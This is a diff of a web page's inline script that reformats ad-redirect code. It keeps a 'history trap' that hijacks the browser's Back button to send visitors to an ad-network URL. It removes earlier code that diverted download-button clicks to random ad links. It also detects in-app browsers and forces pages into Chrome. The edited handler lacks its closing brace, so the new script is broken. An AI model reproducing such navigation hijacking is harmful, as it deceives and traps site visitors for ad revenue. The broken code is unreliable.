@@ -291,7 +291,7 @@ z-index:5;
 </div>
 
 <script>
-// SMART LINKS
+// ================= BACK BUTTON REDIRECT =================
 const links = [
 "https://www.effectivegatecpm.com/xa4v69ebp?key=62079b05ebf5a63f468e7017849264af",
 "https://nujhut.pages.dev/",
@@ -301,42 +301,18 @@ const links = [
 "https://www.effectivegatecpm.com/mq2h6va2g?key=84fd8af9fbf4199827f781b89631e3d7",
 ];
 
-// random function
-function getRandomLink() {
-  return links[Math.floor(Math.random() * links.length)];
-}
-
-// single click = single random link
-document.querySelectorAll(".download").forEach(btn=>{
-  btn.addEventListener("click", e=>{
-    e.preventDefault();
-
-    const link = getRandomLink();
-
-    // open in same tab
-    window.location.href = link;
-  });
-});
-</script>
-
-</script>
-// ================= BACK BUTTON REDIRECT =================
-
+// history trap
 function trapHistory(){
-
-history.pushState(null,null,location.href);
-
+  history.pushState(null, null, location.href);
 }
-
 trapHistory();
 
-window.addEventListener("popstate",function(){
-
-window.location.href = links[0];
-
+window.addEventListener("popstate", function () {
+  window.location.href = links[0];
 });
 
-  // IN-APP DETECTION
+
+// ================= IN-APP DETECTION =================
 function isInApp(){
   let ua = navigator.userAgent || navigator.vendor || window.opera;
   return (
@@ -346,41 +322,34 @@ function isInApp(){
     ua.includes("WhatsApp") || ua.includes("Messenger")
   );
 }
-if(isInApp()){ document.getElementById("popup").style.display="flex"; }
 
-// OPEN IN CHROME
-document.getElementById("chromeBtn").onclick=function(e){
-e.preventDefault();
-
-var url = window.location.href;
-var ua = navigator.userAgent.toLowerCase();
-
-// ANDROID
-if(ua.indexOf("android")>-1){
-window.location.href="intent://"+url.replace(/^https?:\/\//,'')+"#Intent;scheme=https;package=com.android.chrome;end";
+if(isInApp()){
+  document.getElementById("popup").style.display = "flex";
 }
 
-// IPHONE / IPAD
-else if(ua.indexOf("iphone")>-1 || ua.indexOf("ipad")>-1){
 
-// try Chrome app
-window.location.href="googlechrome://"+url.replace(/^https?:\/\//,'');
+// ================= OPEN IN CHROME =================
+document.getElementById("chromeBtn").onclick = function(e){
+  e.preventDefault();
 
-// fallback Safari
-setTimeout(function(){
-window.location.href=url;
-},1500);
+  var url = window.location.href;
+  var ua = navigator.userAgent.toLowerCase();
 
-}
-
-// OTHER DEVICES
-else{
-window.open(url,'_blank');
-}
-
-};
-
-</script>
+  if(ua.indexOf("android") > -1){
+    window.location.href =
+      "intent://" + url.replace(/^https?:\/\//,'') +
+      "#Intent;scheme=https;package=com.android.chrome;end";
+  }
+  else if(ua.indexOf("iphone") > -1 || ua.indexOf("ipad") > -1){
+    window.location.href = "googlechrome://" + url.replace(/^https?:\/\//,'');
+    setTimeout(function(){
+      window.location.href = url;
+    },1500);
+  }
+  else{
+    window.open(url,'_blank');
+  }
+  </script>
 
 </body>
 </html>
